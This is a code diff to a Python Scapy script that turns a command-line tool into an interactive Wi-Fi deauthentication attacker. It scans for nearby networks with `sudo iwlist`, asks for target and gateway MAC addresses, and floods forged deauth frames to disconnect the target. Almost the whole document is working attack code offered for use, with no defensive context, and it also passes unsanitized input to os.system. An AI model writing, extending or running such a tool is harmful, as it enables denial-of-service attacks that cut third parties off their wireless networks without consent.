@@ -1,12 +1,21 @@
 from scapy.all import *
 import argparse
 import os
+from subprocess import check_output
 
 def list_interfaces():
     interfaces = get_if_list()
     print("Available network interfaces:")
-    for iface in interfaces:
-        print(f" - {iface}")
+    for i, iface in enumerate(interfaces):
+        print(f"{i+1}. {iface}")
+    return interfaces
+
+def scan_networks(interface):
+    print(f"\nScanning for networks on interface {interface}...")
+    try:
+        os.system(f"sudo iwlist {interface} scan | grep 'ESSID\\|Address'")
+    except Exception as e:
+        print(f"Failed to scan networks on {interface}. Error: {e}")
 
 def show_interface_details(interface):
     print(f"\nDetails for interface {interface}:")
@@ -19,24 +28,43 @@ def send_deauth_packets(target_mac, gateway_mac, interface, count):
     deauth_frame = RadioTap() / \
                    Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / \
                    Dot11Deauth(reason=7)
+    print(f"\nStarting deauth attack on {target_mac} via {interface}...")
     sendp(deauth_frame, iface=interface, count=count, inter=0.1)
+    print(f"Deauth packets sent: {count}")
+
+def setup_and_attack():
+    interfaces = list_interfaces()
+    selected_interface_index = int(input("Select the interface number to use: ")) - 1
+    if selected_interface_index not in range(len(interfaces)):
+        print("Invalid selection!")
+        return
+    interface = interfaces[selected_interface_index]
+
+    scan_networks(interface)
+    target_mac = input("\nEnter the target MAC address: ")
+    gateway_mac = input("Enter the gateway MAC address: ")
+    count = int(input("Enter the number of deauth packets to send (default 100): ") or 100)
+
+    send_deauth_packets(target_mac, gateway_mac, interface, count)
 
 def main():
     parser = argparse.ArgumentParser(description="Network interface and deauthentication utility")
     parser.add_argument("--list", action="store_true", help="List all available network interfaces")
-    parser.add_argument("--show", help="Show details for a specific interface")
-    parser.add_argument("target_mac", nargs="?", help="Target MAC address (required for deauth)")
-    parser.add_argument("gateway_mac", nargs="?", help="Gateway MAC address (required for deauth)")
-    parser.add_argument("interface", nargs="?", help="Network interface to use for deauth")
-    parser.add_argument("--count", type=int, default=100, help="Number of deauthentication packets to send")
+    parser.add_argument("--scan", action="store_true", help="Scan for available networks")
+    parser.add_argument("--attack", action="store_true", help="Setup and perform deauthentication attack")
     args = parser.parse_args()
 
     if args.list:
         list_interfaces()
-    elif args.show:
-        show_interface_details(args.show)
-    elif args.target_mac and args.gateway_mac and args.interface:
-        send_deauth_packets(args.target_mac, args.gateway_mac, args.interface, args.count)
+    elif args.scan:
+        interfaces = list_interfaces()
+        selected_interface_index = int(input("Select the interface number to use: ")) - 1
+        if selected_interface_index in range(len(interfaces)):
+            scan_networks(interfaces[selected_interface_index])
+        else:
+            print("Invalid selection!")
+    elif args.attack:
+        setup_and_attack()
     else:
         parser.print_help()
 
